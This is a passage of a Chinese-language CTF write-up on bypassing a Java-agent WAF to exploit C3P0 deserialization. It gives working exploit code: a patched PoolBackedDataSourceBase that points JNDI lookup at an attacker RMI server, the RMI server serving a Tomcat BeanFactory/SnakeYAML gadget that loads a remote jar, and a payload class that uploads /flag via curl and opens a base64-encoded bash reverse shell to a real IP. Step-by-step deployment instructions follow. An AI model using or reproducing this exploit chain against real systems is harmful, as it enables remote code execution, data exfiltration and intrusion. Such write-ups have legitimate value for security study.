        if (cs != null) {
            String tmpString = cs.getProtectionDomain().getCodeSource().getLocation().getFile();
            if (tmpString.endsWith(".jar")) {
                try {
                    fileString = URLDecoder.decode(tmpString, "utf-8");
                } catch (UnsupportedEncodingException var4) {
                    fileString = URLDecoder.decode(tmpString);
                }
            }
        }

        return (new File(fileString)).toString();
    }

    public static void agentmain(String agentOps, Instrumentation inst) throws Exception {
        simpleDemo0(agentOps, inst);
        simpleDemo1(agentOps, inst);
    }

    public static void simpleDemo0(String agentOps, final Instrumentation inst) throws Exception {
        inst.addTransformer(new ClassFileTransformer() {
            public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException {
                if ("org/apache/tomcat/util/net/SocketBufferHandler".equals(className)) {
                    try {
                        AgentDemo.el(inst, loader);
                    } catch (Exception var7) {
                        var7.printStackTrace();
                    }
                }

                return null;
            }
        }, true);
    }

    public static void simpleDemo1(String agentOps, final Instrumentation inst) throws Exception {
        inst.addTransformer(new ClassFileTransformer() {
            public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException {
                if ("org/apache/tomcat/util/net/SocketBufferHandler".equals(className)) {
                    try {
                        AgentDemo.c3p0(inst, loader);
                    } catch (Exception var7) {
                        var7.printStackTrace();
                    }
                }

                return null;
            }
        }, true);
    }

    public static byte[] el(Instrumentation inst, ClassLoader loader) throws Exception {
        Class<?> elProcessorClass = Class.forName("javax.el.ELProcessor", true, loader);
        ClassPool classPool = new ClassPool(true);
        classPool.insertClassPath(new ClassClassPath(elProcessorClass));
        classPool.insertClassPath(new LoaderClassPath(elProcessorClass.getClassLoader()));
        CtClass ctClass = classPool.get(elProcessorClass.getName());
        CtMethod ctMethod = ctClass.getMethod("eval", "(Ljava/lang/String;)Ljava/lang/Object;");
        ctMethod.insertBefore(String.format(" if (expression!=null){\n            return null;\n        }", AgentDemo.class.getName()));
        inst.redefineClasses(new ClassDefinition[]{new ClassDefinition(elProcessorClass, ctClass.toBytecode())});
        ctClass.detach();
        return ctClass.toBytecode();
    }

    public static byte[] c3p0(Instrumentation inst, ClassLoader loader) throws Exception {
        Class<?> aClass = Class.forName("com.mchange.v2.naming.ReferenceIndirector$ReferenceSerialized", true, loader);
        ClassPool classPool1 = new ClassPool(true);
        classPool1.insertClassPath(new ClassClassPath(aClass));
        classPool1.insertClassPath(new LoaderClassPath(aClass.getClassLoader()));
        CtClass ctClass1 = classPool1.get(aClass.getName());
        CtMethod ctMethod1 = ctClass1.getMethod("getObject", "()Ljava/lang/Object;");
        ctMethod1.insertBefore(String.format(" if (reference!=null){\n            return null;\n        }", AgentDemo.class.getName()));
        inst.redefineClasses(new ClassDefinition[]{new ClassDefinition(aClass, ctClass1.toBytecode())});
        ctClass1.detach();
        return ctClass1.toBytecode();
    }
}

```
这里首先有个远程获取jvm的操作，这里就对我们启动的DemoApplication的jvm进行了获取。<br />然后通过getJarFileByClass获取demoagentclass类，并附加到主类中，之前用过java_agent打过恶意类注入，这里大概就是用java-agent给主类添加一个waf.<br />这是agent-main注入，看一下其逻辑
```java
public static void agentmain(String agentOps, Instrumentation inst) throws Exception {
        simpleDemo0(agentOps, inst);
        simpleDemo1(agentOps, inst);
    }
```
分别看一下
```java
public static void simpleDemo0(String agentOps, final Instrumentation inst) throws Exception {
        inst.addTransformer(new ClassFileTransformer() {
            public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException {
                if ("org/apache/tomcat/util/net/SocketBufferHandler".equals(className)) {
                    try {
                        AgentDemo.el(inst, loader);
                    } catch (Exception var7) {
                        var7.printStackTrace();
                    }
                }

                return null;
            }
        }, true);
    }
```
对org/apache/tomcat/util/net/SocketBufferHandler类进行hook<br />看一下AgentDemon.el方法
```java
 public static byte[] el(Instrumentation inst, ClassLoader loader) throws Exception {
        Class<?> elProcessorClass = Class.forName("javax.el.ELProcessor", true, loader);
        ClassPool classPool = new ClassPool(true);
        classPool.insertClassPath(new ClassClassPath(elProcessorClass));
        classPool.insertClassPath(new LoaderClassPath(elProcessorClass.getClassLoader()));
        CtClass ctClass = classPool.get(elProcessorClass.getName());
        CtMethod ctMethod = ctClass.getMethod("eval", "(Ljava/lang/String;)Ljava/lang/Object;");
        ctMethod.insertBefore(String.format(" if (expression!=null){\n            return null;\n        }", AgentDemo.class.getName()));
        inst.redefineClasses(new ClassDefinition[]{new ClassDefinition(elProcessorClass, ctClass.toBytecode())});
        ctClass.detach();
        return ctClass.toBytecode();
    }
```
主要逻辑是通过javassist修改javax.el.ELProcessor类中的源码。当expression!=null时，返回null。因此我们无法通过C3P0链执行EL表达式了。另一个Demo函数也类似。
```java
public static byte[] c3p0(Instrumentation inst, ClassLoader loader) throws Exception {
        Class<?> aClass = Class.forName("com.mchange.v2.naming.ReferenceIndirector$ReferenceSerialized", true, loader);
        ClassPool classPool1 = new ClassPool(true);
        classPool1.insertClassPath(new ClassClassPath(aClass));
        classPool1.insertClassPath(new LoaderClassPath(aClass.getClassLoader()));
        CtClass ctClass1 = classPool1.get(aClass.getName());
        CtMethod ctMethod1 = ctClass1.getMethod("getObject", "()Ljava/lang/Object;");
        ctMethod1.insertBefore(String.format(" if (reference!=null){\n            return null;\n        }", AgentDemo.class.getName()));
        inst.redefineClasses(new ClassDefinition[]{new ClassDefinition(aClass, ctClass1.toBytecode())});
        ctClass1.detach();
        return ctClass1.toBytecode();
    }
}
```
c3p0的两个链似乎没法打了。<br />如此来看，只能jndi了，但是jndi需要fastjson环境，而且1.8_191算jndi的一个高版本绕过。


<a name="HAx6p"></a>
## 利用思路
之前提到过，referenceSerialized#getObject调用过Context.lookup()<br />由于contextname默认为空，因此没去利用。
```java
private void writeObject( ObjectOutputStream oos ) throws IOException
	{
		oos.writeShort( VERSION );
		try
		{
			//test serialize
			SerializableUtils.toByteArray(connectionPoolDataSource);
			oos.writeObject( connectionPoolDataSource );
		}
		catch (NotSerializableException nse)
		{
			com.mchange.v2.log.MLog.getLogger( this.getClass() ).log(com.mchange.v2.log.MLevel.FINE, "Direct serialization provoked a NotSerializableException! Trying indirect.", nse);
			try
			{
				Indirector indirector = new com.mchange.v2.naming.ReferenceIndirector();
				oos.writeObject( indirector.indirectForm( connectionPoolDataSource ) );
			}
			...
	}
```
```java
public IndirectlySerialized indirectForm(Object var1) throws Exception {
        Reference var2 = ((Referenceable)var1).getReference();
        return new ReferenceSerialized(var2, this.name, this.contextName, this.environmentProperties);
    }
```
如果要去修改的话，有三种思路：

- 修改C3P0源码
- Agent技术修改indirectForm源码
- 直接修改序列化字节码
<a name="zuMaE"></a>
## 修改源码
序列化的时候，让Context.name能被赋值上去
```java
public IndirectlySerialized indirectForm(Object paramObject) throws Exception {
        Properties pros=new Properties();
        Name name=new CompoundName("rmi://ip:1234/Evil",pros);
        return new ReferenceSerialized(null, null, name, this.environmentProperties);
    }
```
或者该writeobject
```java
com.mchange.v2.naming.ReferenceIndirector indirector = new com.mchange.v2.naming.ReferenceIndirector();\n" +
                java.util.Properties properties = new java.util.Properties();
               javax.naming.CompoundName compoundName = new javax.naming.CompoundName(\"rmi://vps:9999/calc\",properties); 
               indirector.setNameContextName(compoundName);
   oss.writeObject( indirector.indirectForm( connectionPoolDataSource ) )
```
师傅们用了很多很复杂的方法，这里我想了比较简单好操作的方法，本地起个和包一模一样的com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase,类似于阿里云的那个bypassit改源码。<br />然后赋值所有的内容，修改writeobject方法，这样就会优先调用本地的类。

```java
private void writeObject( ObjectOutputStream oos ) throws IOException
    {
        oos.writeShort( VERSION );
        try
        {
            //test serialize
            SerializableUtils.toByteArray(connectionPoolDataSource);
            oos.writeObject( connectionPoolDataSource );
        }
        catch (NotSerializableException nse)
        {
            com.mchange.v2.log.MLog.getLogger( this.getClass() ).log(com.mchange.v2.log.MLevel.FINE, "Direct serialization provoked a NotSerializableException! Trying indirect.", nse);
            try
            {
                ReferenceIndirector indirector = new com.mchange.v2.naming.ReferenceIndirector();
                java.util.Properties properties = new java.util.Properties();
                javax.naming.CompoundName compoundName = new javax.naming.CompoundName("rmi://43.143.192.19:9999/calc",properties);
                indirector.setNameContextName(compoundName);
                oos.writeObject( indirector.indirectForm( connectionPoolDataSource ) );
            }
            catch (IOException indirectionIOException)
            { throw indirectionIOException; }
            catch (Exception indirectionOtherException)
            { throw new IOException("Problem indirectly serializing connectionPoolDataSource: " + indirectionOtherException.toString() ); }
        }
        oos.writeObject( dataSourceName );
        try
        {
            //test serialize
            SerializableUtils.toByteArray(extensions);
            oos.writeObject( extensions );
        }
        catch (NotSerializableException nse)
        {
            com.mchange.v2.log.MLog.getLogger( this.getClass() ).log(com.mchange.v2.log.MLevel.FINE, "Direct serialization provoked a NotSerializableException! Trying indirect.", nse);
            try
            {
                Indirector indirector = new com.mchange.v2.naming.ReferenceIndirector();
                oos.writeObject( indirector.indirectForm( extensions ) );
            }
            catch (IOException indirectionIOException)
            { throw indirectionIOException; }
            catch (Exception indirectionOtherException)
            { throw new IOException("Problem indirectly serializing extensions: " + indirectionOtherException.toString() ); }
        }
        oos.writeObject( factoryClassLocation );
        oos.writeObject( identityToken );
        oos.writeInt(numHelperThreads);
    }
```
改了以后，就能给Context.name赋值了。
<a name="JD3g0"></a>
## 序列化
```java
import com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;
import com.mchange.v2.naming.ReferenceIndirector;
import javassist.*;

import javax.naming.NamingException;
import javax.naming.Reference;
import javax.naming.Referenceable;
import javax.sql.ConnectionPoolDataSource;
import javax.sql.PooledConnection;
import java.io.*;
import java.lang.reflect.Field;
import java.sql.SQLException;
import java.sql.SQLFeatureNotSupportedException;
import java.util.logging.Logger;
import org.yaml.snakeyaml.Yaml;

public class C3P0_NoURLClassLoader {


    public static void Pool_Serial(Object object) throws NoSuchFieldException, IllegalAccessException, IOException, CannotCompileException, InstantiationException, NoSuchMethodException, ClassNotFoundException {




        //序列化流写入文件
        FileOutputStream fos = new FileOutputStream(new File("exp.bin"));
        ObjectOutputStream oos = new ObjectOutputStream(fos);
        oos.writeObject(object);

    }

    //反序列化
    public static ReferenceIndirector Pool_Deserial() throws IOException, ClassNotFoundException {
        FileInputStream fis = new FileInputStream(new File("exp.bin"));
        ObjectInputStream objectInputStream = new ObjectInputStream(fis);
        return (ReferenceIndirector) objectInputStream.readObject();
    }

    //字节码转Base64
    public static String Base64_Encode(String filename) throws IOException {
        File file = new File(filename);
        FileInputStream inputStream=new FileInputStream(filename);
        byte[] data = new byte[(int) file.length()];
        inputStream.read(data);
        return java.util.Base64.getEncoder().encodeToString(data);
    }

    public static void main(String[] args) throws ClassNotFoundException, NotFoundException, CannotCompileException, InstantiationException, IllegalAccessException, IOException, NoSuchFieldException, NoSuchMethodException {




        PoolBackedDataSourceBase poolBackedDataSourceBase = new PoolBackedDataSourceBase(false);
        Class cls = Class.forName("com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase");
        Field field = cls.getDeclaredField("connectionPoolDataSource");
        field.setAccessible(true);
        NewPoolBacked newPoolBacked = new NewPoolBacked();
        field.set(poolBackedDataSourceBase,newPoolBacked);

        Pool_Serial(poolBackedDataSourceBase);
        System.out.println(Base64_Encode("exp.bin"));
        ReferenceIndirector referenceIndirector = Pool_Deserial();
//        System.out.println(referenceIndirector.getNameContextName());


    }

    public static class NewPoolBacked implements ConnectionPoolDataSource, Referenceable {

        @Override
        public Reference getReference() throws NamingException {
            return null;
        }

        @Override
        public PooledConnection getPooledConnection() throws SQLException {
            return null;
        }

        @Override
        public PooledConnection getPooledConnection(String user, String password) throws SQLException {
            return null;
        }

        @Override
        public PrintWriter getLogWriter() throws SQLException {
            return null;
        }

        @Override
        public void setLogWriter(PrintWriter out) throws SQLException {

        }

        @Override
        public void setLoginTimeout(int seconds) throws SQLException {

        }

        @Override
        public int getLoginTimeout() throws SQLException {
            return 0;
        }

        @Override
        public Logger getParentLogger() throws SQLFeatureNotSupportedException {
            return null;
        }


    }
}
```
这里我稍微修改了一下师傅的代码。

<a name="i1vL0"></a>
## 远程RMI
```java
import com.sun.jndi.rmi.registry.ReferenceWrapper;
import org.apache.naming.ResourceRef;

import javax.naming.NamingException;
import javax.naming.Reference;
import javax.naming.StringRefAddr;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class RMIServer {
    public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException{

        //System.setProperty("java.rmi.server.hostname", "43.143.192.19");
        Registry registry = LocateRegistry.createRegistry(9999);
        ResourceRef ref = tomcat_snakeyaml();
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(ref);
        registry.bind("calc",referenceWrapper);
        System.out.println("RMI运行中");

    }
    public static ResourceRef tomcat_snakeyaml(){
        ResourceRef ref = new ResourceRef("org.yaml.snakeyaml.Yaml", null, "", "",
                true, "org.apache.naming.factory.BeanFactory", null);
        String yaml = "!!javax.script.ScriptEngineManager [\n" +
                "  !!java.net.URLClassLoader [[\n" +
                "    !!java.net.URL [\"http://43.143.192.19:8888/exp.jar\"]\n" +
                "  ]]\n" +
                "]";
        ref.add(new StringRefAddr("forceString", "a=load"));
        ref.add(new StringRefAddr("a", yaml));
        return ref;
    }
}

```
这里用的是snakeyaml，这个链子目前还没接触过，先这么用着。

然后有个exp.jar<br />[https://github.com/artsploit/yaml-payload](https://github.com/artsploit/yaml-payload)<br />下载以后，<br />修改里面的命令为你要执行的命令
```java
package artsploit;

import javax.script.ScriptEngine;
import javax.script.ScriptEngineFactory;
import java.io.IOException;
import java.util.List;

public class AwesomeScriptEngineFactory implements ScriptEngineFactory {

    public AwesomeScriptEngineFactory() {
        try {
            Runtime.getRuntime().exec("curl 43.143.192.19:1145 -T /flag");
            Runtime.getRuntime().exec("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80My4xNDMuMTkyLjE5LzExNDUgMD4mMQ==}|{base64,-d}|{bash,-i}");

        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    @Override
    public String getEngineName() {
        return null;
    }

    @Override
    public String getEngineVersion() {
        return null;
    }

    @Override
    public List<String> getExtensions() {
        return null;
    }

    @Override
    public List<String> getMimeTypes() {
        return null;
    }

    @Override
    public List<String> getNames() {
        return null;
    }

    @Override
    public String getLanguageName() {
        return null;
    }

    @Override
    public String getLanguageVersion() {
        return null;
    }

    @Override
    public Object getParameter(String key) {
        return null;
    }

    @Override
    public String getMethodCallSyntax(String obj, String m, String... args) {
        return null;
    }

    @Override
    public String getOutputStatement(String toDisplay) {
        return null;
    }

    @Override
    public String getProgram(String... statements) {
        return null;
    }

    @Override
    public ScriptEngine getScriptEngine() {
        return null;
    }
}

```
题目没有curl，但是可以反弹shell。
<a name="wJ0T1"></a>
## 操作流程
要在vps启动三个程序，一个是上传RMI，<br />需要在idea打包，主类为RMI.server，上传到vps，<br />启用命令
```java
java -jar -Djava.rmi.server.hostname=43.143.192.19 RMIShell.jar
```
这里坑在单独暴露9999端口不得行，我选择暴露所有端口，在防火墙添加规则里面选择了all，不管那么多了，坑了我两天。

然后再开个端口，输入
```java
python3 -m http.server 8888
```
挂载恶意类，不多说了。

然后监听反弹shell的端口。

找到对应路由，发包，反弹shell拿到flag。




